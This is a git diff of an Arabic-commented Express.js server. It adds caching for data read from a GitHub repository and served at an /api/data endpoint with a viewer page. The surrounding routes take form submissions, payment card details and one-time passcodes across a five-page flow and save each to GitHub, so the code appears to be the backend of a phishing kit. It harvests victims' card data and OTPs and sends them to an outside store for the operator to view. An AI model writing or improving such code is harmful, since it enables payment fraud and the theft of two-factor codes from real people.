@@ -46,6 +46,34 @@ async function saveToGitHub(newData) {
     });
 }
 
+// ========== المتغير المؤقت للبيانات ==========
+let cachedData = '';
+let lastFetchTime = 0;
+const CACHE_DURATION = 5000; // 5 ثواني
+
+// ========== دالة جلب البيانات من GitHub ==========
+async function fetchFromGitHub() {
+    try {
+        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+        const response = await fetch(url, { 
+            headers: { 
+                Authorization: `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/json'
+            } 
+        });
+        
+        if (response.ok) {
+            const fileInfo = await response.json();
+            const content = Buffer.from(fileInfo.content, 'base64').toString('utf8');
+            return content;
+        }
+        return '';
+    } catch (e) {
+        console.error('❌ خطأ في جلب البيانات:', e.message);
+        return '';
+    }
+}
+
 // ========== المسارات ==========
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page1.html')));
 app.get('/page2', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page2.html')));
@@ -58,25 +86,24 @@ app.get('/data-viewer', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
 });
 
-// ========== API لجلب البيانات (باستخدام الرابط الخام) ==========
+// ========== API لجلب البيانات (من الكاش) ==========
 app.get('/api/data', async (req, res) => {
     try {
-        // استخدام الرابط الخام (raw) من GitHub - مش محتاج توكن للقراءة
-        const url = `https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`;
-        const response = await fetch(url);
+        const now = Date.now();
         
-        if (response.ok) {
-            const content = await response.text();
-            console.log('📄 تم جلب البيانات بنجاح، الطول:', content.length);
-            res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-            res.send(content);
-        } else {
-            console.log('❌ الملف مش موجود على GitHub');
-            res.send('');
+        // لو الكاش قديم، نجيب بيانات جديدة
+        if (now - lastFetchTime > CACHE_DURATION) {
+            console.log('🔄 تحديث الكاش...');
+            cachedData = await fetchFromGitHub();
+            lastFetchTime = now;
+            console.log('✅ تم تحديث الكاش، الطول:', cachedData.length);
         }
+        
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.send(cachedData);
     } catch (e) {
-        console.error('❌ خطأ في جلب البيانات:', e.message);
-        res.send('');
+        console.error('❌ خطأ:', e.message);
+        res.send(cachedData || '');
     }
 });
 
@@ -129,6 +156,11 @@ app.post('/submit-data', async (req, res) => {
 
         await saveToGitHub(logData);
         console.log('✅ البيانات اتحفظت على GitHub');
+        
+        // تحديث الكاش فوراً
+        cachedData = await fetchFromGitHub();
+        lastFetchTime = Date.now();
+        
         res.redirect('/page3');
     } catch (err) {
         console.error('❌ خطأ:', err.message);
@@ -153,6 +185,10 @@ app.post('/submit-payment', async (req, res) => {
 
         await saveToGitHub(logData);
         console.log('✅ بيانات البطاقة اتحفظت على GitHub');
+        
+        cachedData = await fetchFromGitHub();
+        lastFetchTime = Date.now();
+        
         res.redirect('/page4');
     } catch (err) {
         console.error('❌ خطأ:', err.message);
@@ -174,12 +210,24 @@ app.post('/submit-otp', async (req, res) => {
 
         await saveToGitHub(logData);
         console.log('✅ OTP اتحفظ على GitHub');
+        
+        cachedData = await fetchFromGitHub();
+        lastFetchTime = Date.now();
+        
         res.redirect('/page5');
     } catch (err) {
         console.error('❌ خطأ:', err.message);
         res.status(500).send('خطأ في حفظ البيانات');
     }
 });
+
+// ========== تحميل الكاش عند بدء التشغيل ==========
+(async () => {
+    console.log('🔄 جلب البيانات الأولي...');
+    cachedData = await fetchFromGitHub();
+    lastFetchTime = Date.now();
+    console.log('✅ تم تحميل الكاش، الطول:', cachedData.length);
+})();
 
 app.listen(PORT, () => {
     console.log(`✅ السيرفر شغال على port ${PORT}`);
